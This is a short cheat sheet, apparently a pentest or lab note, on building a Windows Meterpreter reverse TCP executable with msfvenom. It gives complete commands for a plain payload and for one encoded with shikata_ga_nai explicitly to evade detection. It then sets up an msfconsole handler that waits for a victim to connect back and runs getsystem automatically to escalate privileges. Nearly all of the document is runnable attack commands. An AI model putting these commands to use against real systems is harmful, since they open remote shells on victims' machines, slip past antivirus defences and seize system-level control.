## Using msfvenom for Reverse TCP Payload

1. **Check Payload Options**:
   
   ```
   msfvenom --payload-options -p windows/meterpreter/reverse_tcp
   ```
2. **Generate Basic Payload**:
   ```
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=9002 -f exe -o payload.exe
   ```
   - `-p`: Payload type (Meterpreter reverse TCP for Windows).
   - `LHOST`: Attacker's IP.
   - `LPORT`: Listener port (default 4444).
   - `-f exe`: Output as Windows executable.
   - `-o`: Output file path.
3. **Generate Encoded Payload** (Evade Detection):
   ```
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=9002 -b "\x00" -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
   ```
   - `-a x86`: 32-bit architecture.
   - `-b "\x00"`: Avoid bad characters.
   - `-e`: Encoder (Shikata Ga Nai).
   - `-i 3`: Encoding iterations.
4. **Verify File**:
   ```
   ls
   file payload.exe  # Confirms PE32 executable
   ```

## Setup Listener (in msfconsole)
Run `msfconsole` with privilege escalation.

 ```
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 10.0.2.9
 set LPORT 9002
 set AutoRunScript getsystem
 exploit
 ```
 Waits for victim connection.
